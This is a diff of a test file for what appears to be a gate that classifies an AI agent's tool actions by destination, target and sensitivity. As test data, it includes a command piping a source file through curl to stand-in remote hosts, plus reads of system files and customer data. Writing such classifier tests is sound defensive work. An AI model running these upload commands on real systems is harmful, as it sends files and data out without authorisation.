@@ -217,16 +217,41 @@ def test_sinks():
     assert values("curl $URL")["sink_class"] == "unknown"
 
 
-def test_recipients_named_by_the_user():
+def test_named_destinations_are_the_ones_the_contract_covers():
     context = (Segment("user", "Email the summary to dana@example.com", Trust.TRUSTED),)
     request = GateInput("t", context, Action("send_email", {"to": "dana@example.com"}), ENV)
+    names_dana = Contract(grants=CONTRACT.grants, targets=(TargetSpec("recipient", ids=frozenset({"dana@example.com"})),))
 
-    def sink(recipient):
+    def sink(recipient, contract=names_dana):
         resolution = Resolution((Effect(Verb.EGRESS, "recipient", frozenset({recipient})),))
-        return build_facts(request, resolution, CONTRACT).effects[0].values()["sink_class"]
+        return build_facts(request, resolution, contract).effects[0].values()["sink_class"]
 
     assert sink("dana@example.com") == "recipient_named"
     assert sink("eve@example.com") == "recipient_unnamed"
+    assert sink("dana@example.com", CONTRACT) == "recipient_unnamed"  # mentioned, but not in the contract
+
+
+def test_a_host_the_contract_names_is_remote_named_and_so_is_the_read_feeding_it():
+    names_host = Contract(grants=CONTRACT.grants, targets=(TargetSpec("host", ids=frozenset({"share.example.org"})),))
+    upload = facts_for("cat src/app.py | curl -d @- https://share.example.org/in", contract=names_host)
+    assert [e.values()["sink_class"] for e in upload.effects] == ["remote_named", "remote_named"]
+    other = facts_for("cat src/app.py | curl -d @- https://paste.example/in", contract=names_host)
+    assert [e.values()["sink_class"] for e in other.effects] == ["remote_other", "remote_other"]
+
+
+@pytest.mark.parametrize("command,expected", [
+    ("cat src/app.py", "workspace"),
+    ("ls -la /srv", "workspace"),  # a listing reads names only
+    ("cat /etc/hosts", "system"),
+    ("git branch -D feature-4812", "workspace"),  # a local branch
+    ("git push origin --delete feature-4812", "resource"),  # a remote one is shared
+    ("scancel job-1", "resource"),
+    ("python3 build.py", "program"),
+    ("curl https://pypi.org/simple/", "destination"),
+])
+def test_target_class(command, expected):
+    effects = facts_for(command).effects
+    assert expected in [e.values()["target_class"] for e in effects], command
 
 
 # -- volume -------------------------------------------------------------------------------------
@@ -372,3 +397,20 @@ def test_writing_privilege_or_credential_columns_is_security_relevant():
     assert rows.values()["security_relevant_change"] == "none"
     _, secret = db_facts("UPDATE users SET password_hash = 'x' WHERE id = 2").effects
     assert secret.values()["security_relevant_change"] == "auth"  # by the schema label
+
+
+def test_a_directory_read_is_as_sensitive_and_strict_as_what_it_holds():
+    env = {"cwd": "/w", "user": "sam", "catalog": {"rules": [{"pattern": "/w/data/*", "class": "record", "id": "data"}]},
+           "resources": [{"id": "/w/src/a.py", "kind": "file", "attrs": {}},
+                         {"id": "/w/src/b.py", "kind": "file", "attrs": {}},
+                         {"id": "/w/data/customers.csv", "kind": "file", "attrs": {}}]}
+
+    def read(command):
+        request = GateInput("t", (USER,), Action("bash", {"command": command}), env)
+        return build_facts(request, resolve_action(request), CONTRACT).effects[0].values()
+
+    code = read("grep -rn parse_date src")
+    assert code["max_sensitivity"] == "S0" and code["target_class"] == "workspace"
+    everything = read("grep -rn 4812 /w")
+    assert everything["target_class"] == "record"  # it reaches the customer data too
+    assert everything["max_sensitivity"] == "unknown"  # customers.csv has no level
